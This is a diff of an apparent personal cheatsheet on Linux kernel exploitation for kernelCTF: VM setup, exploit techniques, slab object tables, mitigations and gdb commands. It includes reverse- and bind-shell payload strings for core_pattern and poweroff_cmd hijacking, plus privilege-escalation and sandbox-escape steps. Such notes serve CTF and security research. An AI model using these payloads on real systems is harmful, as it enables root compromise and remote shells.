@@ -4,9 +4,10 @@ title:  "Welcome to Jekyll!"
 categories: cheatsheet
 ---
 
-## kernelCTF
+## Linux Kernel
 
-### VM setup
+### kernelCTF
+#### VM setup
 ``` bash
 # 1. Get VM script
 https://github.com/google/security-research/blob/88077ea2e1beaa17107cd9d7ee6beb97faa6468e/kernelctf/simulator/local_runner.sh
@@ -26,7 +27,7 @@ mount -t 9p -o trans=virtio -o version=9p2000.L test_mount ${rootmnt}/chroot/mnt
 find . -print0 | cpio --null --owner=root -o --format=newc > ../ramdisk_v1.img
 ```
 
-### Information
+#### Information
 ``` bash
 # Kernel image (bzImage)
 wget https://storage.googleapis.com/kernelctf-build/releases/lts-X.X.X/bzImage
@@ -42,28 +43,326 @@ curl https://storage.googleapis.com/kernelctf-build/releases/lts-X.X.X/COMMIT_IN
 wget https://github.com/gregkh/linux/archive/<COMMIT_HASH>.zip
 ## or just one-line
 wget https://github.com/gregkh/linux/archive/$(curl -s https://storage.googleapis.com/kernelctf-build/releases/lts-X.X.X/COMMIT_INFO | sed -n 's/COMMIT_HASH=//p').zip
-
 ```
 
 ### Compilation
-
 ``` bash
 # compile x64 version on aarch64
 make ARCH=x86_64 CROSS_COMPILE=x86_64-linux-gnu- -j`nproc`
 ```
 
+### Common Objects Refcount Fields
+``` c
+// struct file
+// refcount++: fdget()
+// refcount--: fdput()
+file->f_count;
+
+// struct sock
+// refcount++: sock_hold()
+// refcount--: __sock_put()
+#define sk_refcnt		__sk_common.skc_refcnt
+sk->__sk_common.skc_refcnt;
+
+// struct mm_struct
+// refcount++: mmgrab()
+// refcount++: mmdrop()
+mm->mm_count;
+
+// struct pid
+// refcount++: get_pid()
+// refcount--: put_pid()
+pid->count;
+
+// struct task_struct
+// refcount++: get_task_struct()
+// refcount--: put_task_struct()
+t->usage;
+
+// struct cred
+// refcount++: get_cred()
+// refcount--: put_cred()
+cred->usage;
+```
+
+### Common Objects Lock Functions
+``` c
+// struct mm_struct
+mmap_read_lock();
+mmap_read_unlock();
+```
+
+### Exploit
+#### Techiques
+
+Pin CPU
+- `sched_setaffinity()` or `pthread_setaffinity_np()`
+
+```c
+bool pin_on_cpu(int cpu_id)
+{
+    cpu_set_t cpuset;
+    
+    CPU_ZERO(&cpuset);
+    CPU_SET(cpu_id, &cpuset);
+    
+    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) < 0) {
+	    return false;
+    }
+    return true;
+}
+```
+
+KASLR bypass
+
+- Use side channels like [EntryBleed](https://www.willsroot.io/2022/12/entrybleed.html).
+
+- In older versions of Ubuntu, the kernel function `startup_xen` address could be read from `/sys/kernel/notes`. (fixed by CVE-2024-26816)
+
+Auto-reboot after panic or oops
+
+- Set `panic_on_oops=1` and `panic_timeout=1`
+
+Global variable hijacking
+
+- `modprobe_path[]`
+
+    - It will be triggered when attempting to execute an unknown format file.
+
+    - E.g. `modprobe_path[] = "/tmp//modprobe"`
+
+- `core_pattern[]`
+
+    - It will be triggered when an executable causes an SIGSEGV, or zero out `task_struct->mm->pgd` to trigger page fault.
+
+    - E.g. `core_pattern[] = "|/bin/bash -c sh</dev/tcp/ip/port"`
+
+- `poweroff_cmd[]`
+
+    - It won't be triggered basically; you need chain it with other gadgets, such as `tcp_prot.close = &poweroff_work_func`.
+
+    - E.g. `poweroff_cmd[] = "/bin/sh -c /bin/sleep${IFS}10&&/usr/bin/nc${IFS}-lnvp${IFS}13337${IFS}-e${IFS}/bin/bash"`
+
+Kernel shellcode
+
+- Set kernel address as executable by `set_memory_x(page_aligned_addr, num_of_page)`.
+
+- Leak ktext in shellcode - instruction `rdmsr` with `MSR_LSTAR`. (see `syscall_init()` for more details)
+
+Privilege escalation
+
+- `commit_creds(&init_cred)`
+
+Sandbox escape
+
+- ROP do `switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy)`
+
+- Return to userspace and switch to root ns by
+
+    ```c
+    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
+    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
+    setns(open("/proc/1/ns/net", O_RDONLY), 0);
+    ```
+
+Find target task
+
+1. `prctl(PR_SET_NAME)` changes the process name to a unique ID.
+
+2. Start iterating through the `struct task` linked list from `&init_task` and compare each task's name with the unique ID.
+
+Fixed kernel address
+
+- Before Linux v6.1, the kernel address of the CEA (CPU Entry Area) was fixed at `0xfffffe0000000000`, making it possible to place the exploit payload there by triggering an exception.
+
+Bypass error during ROP
+
+- "Illegal context switch in RCU read-side critical section"
+    - Set `current->rcu_read_lock_nesting = 0`.
+
+- "BUG: scheduling while atomic: ..."
+    - Set `oops_in_progress=1`, making  `__schedule_bug()` return safely.
+
+ROP return to userspace
+
+- Use trampoline `swapgs_restore_regs_and_return_to_usermode()`. (renamed to `common_interrupt_return()` now)
+
+- When executing `iretq`, the stack layout should be (from top to bottom):  rip, cs, rflags, rsp and ss.
+
+- Process calls helper to save state before exploiting.
+    ```c
+    static void save_state() {
+      asm(
+          "movq %%cs, %0\n"
+          "movq %%ss, %1\n"
+          "pushfq\n"
+          "popq %2\n"
+          "movq %%rsp, %3\n"
+          : "=r"(cs), "=r"(ss), "=r"(rflags), "=r"(rsp)
+          :
+          : "memory");
+    }
+    ```
+
+[Telefork](https://blog.kylebot.net/2022/10/16/CVE-2022-1786/#Telefork-teleport-back-to-userspace-using-fork)
+
+- By using `vfork()` or `sys_fork()` combined with `msleep()`, the new child process is allowed to continue running while the corrupted parent process remains stuck in kernel space.
+
+Pipe object
+
+- [Pipe primitive (DirtyPipe)](https://github.com/veritas501/pipe-primitive) - mark the merge bit `PIPE_BUF_FLAG_CAN_MERGE`.
+
+- [PageJack](https://i.blackhat.com/BH-US-24/Presentations/US24-Qian-PageJack-A-Powerful-Exploit-Technique-With-Page-Level-UAF-Thursday.pdf) - partial overwrite the `struct page *` field.
+
+binfmt
+
+1. Call `__register_binfmt()` to register the corrupted object into the global linked list.
+
+2. Reclaim the object and create a fake `struct linux_binfmt` object.
+
+3. Trigger ROP when analyzing the file format
+
+Extend race window
+
+- make all timerfds wakeup at the same time
+
+    ```c
+    int epoll_fd[EPOLL_CNT];
+    int tfds[TFDS_CNT];
+    int timer_fd = timerfd_create(CLOCK_MONOTONIC, 0);
+    struct epoll_event event = { .events = 0 };
+    struct itimerspec new = {.it_value.tv_nsec = 20};
+
+    for (int i = 0; i < EPOLL_CNT; i++)
+        epoll_fd[i] = epoll_create(1);
+
+    for (int i = 0; i < TFDS_CNT; i++)
+        tfds[i] = dup(timer_fd);
+
+    for (int j = 0; j < EPOLL_CNT; j++) {
+        for (int i = 0; i < TFDS_CNT; i++) {
+            event.data.fd = tfds[i];
+            epoll_ctl(epoll_fd[j], EPOLL_CTL_ADD, tfds[i], &event);
+        }
+    }
+
+    timerfd_settime(timer_fd, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
+    ```
+
+
+#### Objects
+
+| struct name      | size          | flags              | new                                          | free          |
+| ---------------- | ------------- | ------------------ | -------------------------------------------- | ------------- |
+| seq_operations   | 0x20          | GFP_KERNEL_ACCOUNT | shmat                                        | shmdt         |
+| shm_file_data    | 0x20          | GFP_KERNEL_ACCOUNT | open "/proc/self/stat"                       | close         |
+| msg_msg          | 0x30 ~ 0x1000 | GFP_KERNEL_ACCOUNT | msgsnd                                       | msgrcv        |
+| user_key_payload | 0x18 ~ 0x7fff | GFP_KERNEL         | add_key                                      | keyctl_unlink |
+| pipe_buffer      | 0x280         | GFP_KERNEL_ACCOUNT | pipe                                         | close         |
+| timerfd_ctx      | 0xd8          | GFP_KERNEL         | timerfd_create                               | close         |
+| tty_struct       | 0x2b8         | GFP_KERNEL_ACCOUNT | open "/dev/ptmx"                             | close         |
+| poll_list        | 0x10 ~ 0x1000 | GFP_KERNEL         | poll                                         | close         |
+| pg_vec           | pages         | X                  | setsockopt PACKET_VERSION and PACKET_TX_RING | close         |
+| sendmsg          | 0x10 ~ 0x5000 | GFP_KERNEL         | sendmsg                                      |               |
+| setxattr         | 0x1 ~ 0xffff  | GFP_KERNEL         | setxattr                                     |               |
+|                  |               |                    |                                              |               |
+| ctl_buf          | 0 ~ 0x5000    | GFP_KERNEL         |                                              |               |
+| xdp_umem         | 0x70          |                    |                                              |               |
+| netlink_sock     | 0x468         |                    |                                              |               |
+
+Some tricks
+
+- sendmsg - the buffer allocated by sendmsg is released immediately. However, we can leverage `setsockopt(SO_{SND,RCV}BUF)` to fill the send and receive buffer, preventing the buffer from being released.
+    ```c
+    int n = 0x0;
+    int sfd[2];
+    socketpair(AF_UNIX, SOCK_STREAM, 0, sfd);
+    setsockopt(sfd[1], SOL_SOCKET, SO_SNDBUF, (char *)&n, sizeof(n)); // 0x1200 (min sndbuf size)
+    setsockopt(sfd[0], SOL_SOCKET, SO_RCVBUF, (char *)&n, sizeof(n)); // 0x0900 (min rcvbuf size)
+    write(sfd[1], buf, 0x1181); // hanging
+    ```
+
+- pipe_buffer - we can use `fcntl(F_SETPIPE_SZ)` to adjust the size.
+
+- msg_msg - with `MSG_COPY`, we can leak addresses without releasing the object.
+
+
+
+### Features
+
+#### Migitations
+
+| Name                            | Description                                                  |
+| ------------------------------- | ------------------------------------------------------------ |
+| CONFIG_SLAB_FREELIST_RANDOM | Randomizes the freelist order, making the retrieval order of objects within the same slab unpredictable.|
+| CONFIG_SLAB_FREELIST_HARDENED | Provides enhanced security by checking for double free, randomizing the next pointer, and enforcing pointer alignment.<br /><br />Since allocations directly use `c->freelist` for returning objects, if the victim object is at the freelist head, it bypasses `freelist_ptr_{decode,encode}()` and avoids corruption. |
+| CONFIG_HARDENED_USERCOPY | Hardens memory copying between the kernel and userspace using `check_object_size()`. For example, `copy_to_user()` cannot copy data exceeding the size of the object. |
+| CONFIG_KMALLOC_SPLIT_VARSIZE | Allocates variable-sized objects in **separate caches**.<br /><br />However, it does not prevent UAF if the vulnerable object itself is variable-sized. |
+| CONFIG_DEBUG_LIST | Emits a warning when a double unlink is detected but performs no additional actions.|
+| CONFIG_RANDOMIZE_BASE | Implements KASLR. |
+| CONFIG_SLAB_VIRTUAL | Ensures slab virtual memory is never reused for a different slab. |
+| CONFIG_RANDOM_KMALLOC_CACHES | There are multiple generic slab caches for each size, 16 by default. The kenrel selects random slabs based on `_RET_IP_` and a random seed. |
+
+
+#### Capabliliby
+`ns_capable()` - creating a new namespace can bypass this check. Common capabilities include `CAP_SYS_ADMIN` (user) or `CAP_NET_ADMIN` (network), etc.
+
+``` c
+bool ns_capable(struct user_namespace *ns, int cap)
+{
+    return ns_capable_common(ns, cap, CAP_OPT_NONE);
+}
+```
+
+`capable()` - global, and cannot be bypassed using a new namespace.
+
+``` c
+bool capable(int cap)
+{
+    return ns_capable(&init_user_ns, cap);
+}
+```
+
+#### Preemption
+
+| Name                     | Description                                                  |
+| ------------------------ | ------------------------------------------------------------ |
+| CONFIG_PREEMPTION        | Configures whether preemption models are enabled.            |
+| CONFIG_PREEMPT           | A preemption model where all kernel code is **preemptible**. This option is generally not enabled by default. |
+| CONFIG_PREEMPT_VOLUNTARY | Another preemption model where kernel code includes **specific preemption points** that allow rescheduling. |
+
+#### Others
+
+x64 RO data writable
+
+- When `X86_CR0_WP` (write protect) is set, the CPU cannot write to read-only pages when privilege level is 0.
+
+Interrupt disabled / enabled
+
+- `disable_irq()` internally calls `__irq_disable()`, which ultimately executes the `cli` instruction to disable interrupts; enabling interrupts follows a similar path and eventually executes the `sti` instruction.
+- Even though `cli` clears the IF (Interrupt Enable) flag, the NMI (Non-Maskable Interrupt), whose interrupt number is 2, can still be triggered.
+
 
 ## Debug
-
 ``` bash
 gdb-multiarch ./vmlinux -ex "target remote :1234"
 ```
 
-### GDB Stub
+### GDB Stubs
 ``` bash
 # breakpoint at specific syscall
 b __do_sys_<SYSCALL_NAME>
 
 # breakpoint at syscall entry
 b entry_SYSCALL_64
+
+# show which slab the address belong to
+slab contains 0xffff888104b2b2a0
+## output: 0xffff888104b2b2a0 @ kmalloc-96
+
+# show slab info
+slab info kmalloc-96
+
+# show page tables
+pt
 ```
